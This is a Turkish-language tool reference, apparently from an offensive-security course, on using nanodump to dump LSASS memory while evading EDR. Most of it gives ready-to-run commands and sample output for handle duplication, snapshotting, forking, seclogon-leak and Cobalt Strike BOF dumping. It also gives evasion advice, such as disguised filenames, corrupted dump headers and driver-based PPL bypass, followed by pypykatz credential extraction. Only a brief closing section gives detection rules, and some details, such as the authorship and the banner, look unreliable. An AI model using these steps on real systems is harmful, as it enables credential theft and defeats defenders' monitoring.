# nanodump

> **Kategori:** [7. Bellek Analizi, LSASS Dökümü ve Kasa Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Modern EDR ve antivirüs çözümlerinin `lsass.exe` bellek korumalarını atlatmak amacıyla tasarlanan; açık tanıtıcı çoğaltma (Handle Duplication), süreç anlık görüntüsü (Process Snapshotting / PssCaptureSnapshot), süreç çatallama (Forking) ve bellek içi şifreleme/imza bozma tekniklerini kullanarak tespit edilmeden LSASS dökümü alan gelişmiş C ve Beacon Object File (BOF) aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında LSASS sürecinden bellek dökümü alma operasyonları, EDR'ların en yoğun odaklandığı ve davranışsal kurallarla en hızlı alarm ürettiği saldırı vektörlerinden biridir. Klasik döküm araçları (`ProcDump`, `Taskmgr`, `comsvcs.dll`) genellikle:
1. `lsass.exe` sürecine doğrudan `PROCESS_ALL_ACCESS` (0x1fffff) veya `PROCESS_VM_READ` (0x0010) + `PROCESS_QUERY_INFORMATION` (0x0400) erişim haklarıyla açık bir tanıtıcı (Handle) açar (Sysmon Event ID 10 tetiklenir).
2. `dbghelp.dll` kütüphanesindeki `MiniDumpWriteDump` API fonksiyonunu çağırır (EDR API hookları anında tespit eder).
3. Diske standart `MDMP` (0x504d444d) baytlarıyla başlayan saf minidump dosyaları yazar (AV/EDR disk tarayıcıları dosyayı karantinaya alır).

**`nanodump`** (HelpSystems / Fortra ekibinden Mario Lupica / @mariol24 tarafından geliştirilen), bu tespit katmanlarının her birini atlatmak için modern siber taarruz tekniklerini harmanlayan yeni nesil bir bellek döküm motorudur. Araç hem bağımsız bir yürütülebilir dosya (EXE/DLL) hem de Cobalt Strike, Sliver veya Havoc C2 altyapıları için bir Beacon Object File (BOF) olarak çalışabilir.

### Temel EDR Atlatma Teknikleri

- **Tanıtıcı Çoğaltma (Handle Duplication):** LSASS sürecine doğrudan `OpenProcess` çağrısı yapmak yerine, sistemde halihazırda LSASS tanıtıcısına sahip olan meşru süreçleri (`csrss.exe`, `svchost.exe`, hatta EDR'ın kendi servis süreçleri) tarar ve bu tanıtıcıyı `DuplicateHandle` ile kopyalar. Böylece kurban sürecin doğrudan `lsass.exe` açtığına dair hiçbir telemetri oluşmaz.
- **Seclogon Tanıtıcı Sızıntısı (`--use-seclogon-leak`):** Windows Secondary Logon (`seclogon`) servisi yeni bir süreç başlatırken geçici olarak LSASS'a tam yetkili bir handle açar. nanodump bu servisi kasıtlı olarak tetikleyip yarış durumunu (Race Condition) istismar ederek sızan handle'ı kopyalar.
- **Süreç Anlık Görüntüsü (Process Snapshotting):** Windows'un meşru `PssCaptureSnapshot` API'sini kullanarak LSASS sürecinin dondurulmuş bir kopyasını sanal olarak alır. Döküm işlemi canlı LSASS yerine bu anlık görüntü üzerinden yapıldığından `lsass.exe` kilitlenmez ve EDR bellek taraması tetiklenmez.
- **Süreç Çatallama (Forking / Process Cloning):** `NtCreateProcessEx` çağrısıyla LSASS sürecinin tam bir klonunu oluşturur, dökümü klon üzerinden alır ve işlem bitince klonu yok eder.
- **İmza Bozma (Signature Invalidation):** Üretilen minidump dosyasının ilk baytlarındaki `MDMP` imzasını rastgele baytlarla bozar. Antivirüs dosyayı taradığında geçerli bir dump olduğunu anlayamaz. Saldırgan analiz makinesinde `nanodump` ile bu imzayı tekrar düzelterek Mimikatz/pypykatz ile açar.

### Mimari Akış Şeması

```
[ Kurban Windows Host (Admin / SYSTEM Hakları) ]
       │
       ├── Yöntem 1: Handle Duplication ──> [ Mevcut LSASS Handle'ını Çoğalt ]
       ├── Yöntem 2: Seclogon Leak      ──> [ Seclogon Servisinden Handle Kap ]
       ├── Yöntem 3: PssCaptureSnapshot  ──> [ Sanal Anlık Görüntü Al ]
       └── Yöntem 4: NtCreateProcessEx   ──> [ LSASS'ı Klonla (Fork) ]
       │
       ▼
[ nanodump Motoru (BOF / In-Memory Execution) ]
       │
       ├── 1. Adım: MiniDumpWriteDump Yerine Özel Ayrıştırma (Custom Dumper)
       ├── 2. Adım: Başlık Baytlarını Boz (MDMP -> 0xDEADBEEF)
       └── 3. Adım: İsteğe Bağlı Bellek İçi Şifreleme (AES / XOR)
       │
       ▼
[ Diske Yazılan Dosya: report.dat (Bozuk İmza / AV Karantinası Atlatıldı) ]
       │
       │ (Veri Sızıntısı / Analiz İstasyonuna Taşıma)
       ▼
[ Saldırgan Linux İstasyonu ]
       │
       ├── 1. Adım: nanodump --restore /tmp/report.dat (MDMP İmzası Onarılır)
       └── 2. Adım: pypykatz minidump /tmp/report.dat (Parolalar ve Hash'ler Dökülür)
```

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Sysmon 10 Atlatma** | `OpenProcess` çağrısı yapmadan meşru tanıtıcıları çoğaltarak LSASS'a erişir. | En katı SIEM korelasyon kurallarını ve EDR sensörlerini sessizce geçer. |
| **Özel MiniDump Motoru** | `dbghelp.dll!MiniDumpWriteDump` kullanmaz; ham PE ve bellek yapılarını kendi yazar. | EDR API kancalarını (Userland Hooking) tamamen etkisiz hale getirir. |
| **İmza Gizleme (Invalid Signature)**| Dosya başlığındaki `MDMP` bayraklarını bozarak diske yazar. | Disk tabanlı antivirüs taramalarını ve ASR kurallarını baypas eder. |
| **Beacon Object File (BOF)** | Cobalt Strike veya Sliver içinde yeni bir süreç açmadan bellek içi çalışır. | Süreç oluşturma (Process Creation) logu üretmeden döküm almayı sağlar. |
| **Seclogon İstismarı** | Doğrudan handle bulunamadığında seclogon servisini tetikleyerek yeni handle sızdırır. | Sıkılaştırılmış sistemlerde dahi tanıtıcı elde etme garantisi sunar. |

### Karşılaştırma Tablosu

| Kriter | nanodump | ProcDump | Dumpert | comsvcs.dll |
|---|---|---|---|---|
| **Erişim Yöntemi** | Handle Duplication / Snapshot | Doğrudan `OpenProcess` | Doğrudan Syscall | Doğrudan API |
| **MiniDumpWriteDump Bağımlılığı**| Hayır (Özel Yazıcı) | Evet | Evet | Evet |
| **İmza Bozma Desteği**| Var (Otomatik) | Yok | Yok | Yok |
| **BOF Desteği** | Var (Yerleşik) | Yok | Kısmi | Yok |
| **EDR Yakalama Oranı** | Çok Düşük | Çok Yüksek | Orta | Yüksek |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```cmd
nanodump.exe [SEÇENEKLER] --write <HEDEF_DOSYA>
beacon> nanodump [SEÇENEKLER] --write <HEDEF_DOSYA>
```

### Kritik Parametre Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `--write <dosya>` | Dökümün kaydedileceği yerel dosya yolu (Zorunlu). | `--write C:\Temp\report.dat` |
| `--duplicate` | Mevcut bir süreçten LSASS tanıtıcısını bularak çoğaltır (Handle Duplication). | Bayrak |
| `--snapshot` | `PssCaptureSnapshot` kullanarak LSASS anlık görüntüsü üzerinden döküm alır. | Bayrak |
| `--fork` | `NtCreateProcessEx` ile LSASS'ı klonlar ve klon üzerinden döküm alır. | Bayrak |
| `--valid` | Minidump başlığını bozmadan geçerli `MDMP` imzasıyla yazar (Varsayılan: Bozuk imza). | Bayrak |
| `--elevate-handle` | Kısıtlı tanıtıcıları `DuplicateHandle` sırasında tam yetkiye yükseltmeye çalışır. | Bayrak |
| `--use-seclogon-leak`| `seclogon` servisindeki tanıtıcı sızıntısını istismar ederek handle edinir. | Bayrak |
| `--chunk-size <sayı>`| Döküm dosyasını yazarken kullanılacak bellek blok boyutu (Bayt cinsinden). | `--chunk-size 65536` |
| `--restore <dosya>` | Bozuk imzalı (`invalid signature`) dump dosyasını analiz için onarır. | `--restore report.dat` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Handle Duplication ile Sysmon 10 Atlatarak LSASS Dökümü Alma

Sistemde çalışan meşru süreçlerden birinin LSASS handle'ı çoğaltılır, imza bozulmuş olarak diske masum görünümlü bir isimle kaydedilir.

```cmd
nanodump.exe --duplicate --write C:\Windows\Temp\debug_trace.dat
```

**Konsol Çıktısı Analizi:**

```text
               ___
  ____ _____ _/ (_)____ _____
 / __ `/ __ `/ / / __ `/ __  \
/ /_/ / /_/ / / / /_/ / /_/ /
\__,_/\__,_/_/_/\__,_/ .___/
                    /_/
    by @mariol24 & Fortra

[+] Scanning running processes for open LSASS handles...
[+] Found valid LSASS handle in PID 892 (svchost.exe) with access 0x1410!
[+] Successfully duplicated LSASS handle!
[+] Writing minidump without using MiniDumpWriteDump...
[+] Obfuscating minidump signature (MDMP header corrupted for evasion)...
[+] Minidump successfully written to C:\Windows\Temp\debug_trace.dat (Size: 48.3 MB)
[!] Remember to restore the signature before analyzing with pypykatz/Mimikatz:
    nanodump.exe --restore C:\Windows\Temp\debug_trace.dat
```

---

### Senaryo 2: Process Snapshotting (PssCaptureSnapshot) ile Döküm Alma

Canlı LSASS sürecine dokunmadan, işletim sisteminin bellek anlık görüntüsü alma yeteneği kullanılarak tam güvenli döküm alınır.

```cmd
nanodump.exe --snapshot --write C:\Users\Public\mem.bin
```

---

### Senaryo 3: Cobalt Strike Beacon Object File (BOF) Olarak Bellekte Çalıştırma

Diske hiçbir çalıştırılabilir dosya koymadan, doğrudan Beacon oturumunun belleği üzerinden LSASS dökümü tetiklenir.

```text
beacon> nanodump --duplicate --snapshot --write C:\Windows\Temp\cache.log
```

**Beacon Konsol Çıktısı:**

```text
[*] Running nanodump BOF by @mariol24...
[+] Acquired SeDebugPrivilege!
[+] Duplicated handle from csrss.exe
[+] Snapshot created successfully via PssCaptureSnapshot
[+] Minidump written to C:\Windows\Temp\cache.log
[+] BOF execution completed!
```

---

### Senaryo 4: Bozuk İmzalı (Invalid Signature) Minidump'ı Onarıp pypykatz ile Çözme

Hedef sistemde EDR taramasından kaçmak için bozulan başlık baytları saldırganın Linux analiz makinesinde düzeltilir ve parolalar çekilir.

```bash
# 1. Linux tarafında nanodump restore ikilisi veya Python ile başlığı düzeltin
# (İlk 4 baytı 'MDMP' - 0x504d444d olarak yeniden yazın)
printf '\x4d\x44\x4d\x50' | dd of=/tmp/cache.log conv=notrunc bs=1 count=4

# 2. pypykatz ile dökümü analiz edin
pypykatz minidump /tmp/cache.log
```

---

### Senaryo 5: Süreç Çatallama (Forking) Yöntemi ile Döküm

`NtCreateProcessEx` ile LSASS'ın bir gölgesi oluşturulur; canlı LSASS hiçbir kilitlenmeye uğramaz.

```cmd
nanodump.exe --fork --write C:\Temp\fork_lsass.dmp --valid
```

---

### Senaryo 6: Seclogon Servis Sızıntısını İstismar Ederek Döküm Alma

Sistemde hiçbir açık LSASS handle'ı bulunamadığında, Secondary Logon servisi tetiklenerek sızan tanıtıcı ele geçirilir.

```cmd
nanodump.exe --use-seclogon-leak --write C:\Windows\Temp\sec_leak.dat
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `Could not find any process with a valid LSASS handle` | Sistemdeki diğer süreçlerde LSASS handle'ı bulunamadı veya yetki kısıtlı. | `--duplicate` yerine `--use-seclogon-leak` veya `--snapshot` bayrağını kullanın; yönetici ayrıcalıklarını doğrulayın. |
| `PssCaptureSnapshot failed with error: 0x80070005 (Access Denied)` | `SeDebugPrivilege` ayrıcalığı eksik veya LSASS üzerinde RunAsPPL koruması devrede. | Komut satırını Elevated başlatın; PPL koruması varsa BYOVD tabanlı sürücü araçlarını (`PPLKiller`) kullanın. |
| `Failed to write dump file / Path not accessible` | Hedef yazma dizininde NTFS yazma yetkisi yok veya güvenlik duvarı ASR kuralı engelledi. | Çıktı dosyasını `C:\Windows\Temp\` veya `C:\Users\Public\` gibi standart yazılabilir dizinlere yönlendirin. |
| `Minidump cannot be opened by Mimikatz / Corrupted file` | Dosya varsayılan olarak bozuk imza (`invalid signature`) ile üretilmiştir. | Analiz öncesinde `nanodump --restore <dosya>` komutunu çalıştırarak `MDMP` başlığını düzeltin. |
| `Forking failed: STATUS_ACCESS_DENIED` | Windows Defender Exploit Guard süreç klonlama çağrısını kısıtladı. | `--fork` yerine `--snapshot` veya `--duplicate` yöntemine geçin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: ÇOK DÜŞÜK (YENİ NESİL EDR EVASION)
──────────────────────────────────────────────────────────────────
[ Sysmon ]          : Event ID 10 anomalisi YOK (Handle Duplication)
[ Windows Logları ] : KDC logu YOKTUR, yalnızca yerel dosya oluşturma
[ Dosya İmzası ]    : Bozuk MDMP başlığı (AV imza taramalarını atlatır)
[ EDR / AV ]        : MiniDumpWriteDump hook'ları baypas edilir
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Sysmon Event ID 10 (Process Access):**
   - Standart araçlar `TargetImage: lsass.exe` için `GrantedAccess: 0x1fffff` üretirken, nanodump `--duplicate` kullandığında bu log üretilmez veya yalnızca `svchost.exe` kaynaklı meşru handle çoğaltması olarak görünür.
2. **Sysmon Event ID 11 (File Create):**
   - Diske yazılan dosyanın adı ve boyutu (40-150 MB). EDR'lar boyut anomalilerini izleyebilir.
3. **API Telemetrisi:**
   - `PssCaptureSnapshot` veya `NtCreateProcessEx` çağrıları gelişmiş kernel sensörleri (Kernel Callback / ETW-TI) tarafından kaydedilebilir.

### 5.2 Ağ ve EDR İmzaları

- **Sıfır Ağ Gürültüsü:** Araç yerel bellekte çalışır ve ağ soketi açmaz.
- **İmza Gizleme:** Dosya `MDMP` yerine rastgele baytlarla başladığından, uç noktadaki hiçbir statik AV tarayıcısı dosyayı minidump olarak tanıyamaz.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1003.001** | OS Credential Dumping: LSASS Memory | EDR korumalarını atlatarak LSASS bellek dökümü alma. |
| **T1562.001** | Impair Defenses: Disable or Modify Tools | Handle duplication ve snapshotting ile EDR tespitlerini etkisiz kılma. |
| **T1055** | Process Injection | BOF formatında bellek içi kod çalıştırma. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Büyük Boyutlu Dosya Yazma** | Minidump dosyasını doğrudan diske yazmak yerine, C2 üzerinden doğrudan belleğe aktarmayı (Named Pipe stream) tercih edin. |
| **Bozuk Başlık Düzeltme İzi** | Hedef makinede asla `--restore` çalıştırmayın; onarma işlemini yalnızca saldırganın kendi Linux istasyonunda yapın. |
| **Masum Dosya Adı Seçimi** | Çıktıyı `lsass.dmp` yerine `setup_log.dat` veya `perf_trace.etl` gibi sistem loglarını taklit edecek isimlerle kaydedin. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma)

**Sigma Kuralı — PssCaptureSnapshot Kullanarak Süreç Klonlama Tespiti:**

```yaml
title: Potential LSASS Snapshot via PssCaptureSnapshot
status: experimental
description: Detects processes capturing snapshots of lsass.exe process memory, indicative of tools like nanodump.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4688
  filter_known:
    CommandLine|contains:
      - '--snapshot'
      - '--duplicate'
  condition: selection and filter_known
level: high
```

**Microsoft Sentinel (KQL) — Şüpheli LSASS Handle Çoğaltma Aktivitesi:**

```kql
DeviceEvents
| where ActionType == "OpenProcessApiCall" or ActionType == "DuplicateProcessHandle"
| where FileName !in ("svchost.exe", "csrss.exe", "lsass.exe")
| where AdditionalFields has "lsass.exe"
| project TimeGenerated, DeviceName, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Handle Duplication ile Gizli Döküm Alma
```cmd
nanodump.exe --duplicate --write C:\Windows\Temp\trace.dat
```
- **Ne Yapar?** Sistemdeki meşru süreçlerin açık LSASS tanıtıcılarını çoğaltır ve bozuk imzalı dökümü diske yazar.
- **Ne Zaman Kullanılır?** Sysmon Event ID 10 ve EDR OpenProcess kurallarını atlatmak için.
- **Parametreler:** `--duplicate`: Tanıtıcı çoğaltma, `--write`: Çıktı dosyası yolu.

### Komut 2: Process Snapshotting ile LSASS'ı Kilitlemeden Döküm Alma
```cmd
nanodump.exe --snapshot --write C:\Users\Public\backup.dat
```
- **Ne Yapar?** `PssCaptureSnapshot` API'si ile sanal anlık görüntü üzerinden döküm alır.
- **Ne Zaman Kullanılır?** Canlı LSASS sürecine doğrudan müdahale etmek istemediğinizde.
- **Parametreler:** `--snapshot`: Anlık görüntü motoru.

### Komut 3: Süreç Çatallama (Forking) ile Döküm
```cmd
nanodump.exe --fork --write C:\Windows\Temp\lsass_fork.dat
```
- **Ne Yapar?** `NtCreateProcessEx` ile LSASS'ın klonunu çıkarır ve klondan döküm alarak klonu sonlandırır.
- **Ne Zaman Kullanılır?** Canlı LSASS üzerindeki kilitlenme ve bellek erişim alarmlarını aşmak için.
- **Parametreler:** `--fork`: Süreç klonlama modu.

### Komut 4: Geçerli Başlık ile Döküm (Doğrudan Analiz İçin)
```cmd
nanodump.exe --duplicate --valid --write C:\Temp\valid_lsass.dmp
```
- **Ne Yapar?** Başlığı bozmadan standart `MDMP` formatında minidump oluşturur.
- **Ne Zaman Kullanılır?** Antivirüs bulunmayan laboratuvar ortamlarında doğrudan Mimikatz ile analiz yaparken.
- **Parametreler:** `--valid`: Geçerli imza bayrağı.

### Komut 5: Cobalt Strike BOF Olarak Çalıştırma
```text
beacon> nanodump --duplicate --snapshot --write C:\Windows\Temp\perf.dat
```
- **Ne Yapar?** Beacon Object File olarak bellek içi çalışır; yeni süreç açmadan döküm alır.
- **Ne Zaman Kullanılır?** Süreç oluşturma (Event 4688) logu bırakmamak için C2 seanslarında.
- **Parametreler:** BOF komut sözdizimi.

### Komut 6: Bozuk İmzayı Onarma (Restore)
```cmd
nanodump.exe --restore C:\Windows\Temp\trace.dat
```
- **Ne Yapar?** EDR atlatmak için bilerek bozulmuş olan minidump dosyasının ilk baytlarını geçerli `MDMP` imzasıyla onarır.
- **Ne Zaman Kullanılır?** Dosyayı saldırgan makinesinde Mimikatz veya pypykatz ile açmadan önce.
- **Parametreler:** `--restore`: Onarma modu.

### Komut 7: Linux Üzerinde Tek Satırda Başlığı Düzeltme
```bash
printf '\x4d\x44\x4d\x50' | dd of=trace.dat conv=notrunc bs=1 count=4
```
- **Ne Yapar?** nanodump ikilisi olmadan Linux kabuğunda dosyanın ilk 4 baytına `MDMP` damgası basar.
- **Ne Zaman Kullanılır?** Linux analiz makinesinde dosya onarımı yaparken.
- **Parametreler:** `dd` ikili yazma parametreleri.

### Komut 8: Kısıtlı Tanıtıcıyı Yükselterek Döküm Alma
```cmd
nanodump.exe --duplicate --elevate-handle --write C:\Temp\elevated.dat
```
- **Ne Yapar?** Düşük haklara sahip çoğaltılmış tanıtıcıları tam okuma haklarına yükseltmeye çalışır.
- **Ne Zaman Kullanılır?** Standart handle kopyalama yetersiz yetki hatası verdiğinde.
- **Parametreler:** `--elevate-handle`: Tanıtıcı yükseltme bayrağı.

### Komut 9: Seclogon Servis Sızıntısını İstismar Etme
```cmd
nanodump.exe --use-seclogon-leak --write C:\Windows\Temp\sec_leak.dat
```
- **Ne Yapar?** Secondary Logon servisinin geçici handle sızıntısını tetikleyerek döküm alır.
- **Ne Zaman Kullanılır?** Açık hiçbir LSASS handle'ı bulunamadığında.
- **Parametreler:** `--use-seclogon-leak`: Seclogon yarış modu.

### Komut 10: Özel Blok Boyutu ile Döküm Yazma
```cmd
nanodump.exe --duplicate --chunk-size 131072 --write C:\Temp\chunk_dump.dat
```
- **Ne Yapar?** Dosyayı 128 KB'lık parçalar halinde yazarak disk I/O sensörlerinin dikkatini çekmez.
- **Ne Zaman Kullanılır?** Disk yazma hızı ve I/O anomalisi izleyen ortamlarda.
- **Parametreler:** `--chunk-size`: Blok bayt boyutu.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [Fortra / nanodump](https://github.com/fortra/nanodump)
- **HelpSystems / Fortra Blog:** [Bypassing LSASS Detections with nanodump](https://www.fortra.com/blog/)
- **Microsoft Learn — PssCaptureSnapshot:** [Process Snapshotting API](https://learn.microsoft.com/en-us/windows/win32/api/processsnapshot/)
- **MITRE ATT&CK Referansı:** [T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)

---

> **Önceki:** [← pypykatz](./pypykatz.md) · **Sonraki:** [Dumpert →](./Dumpert.md)
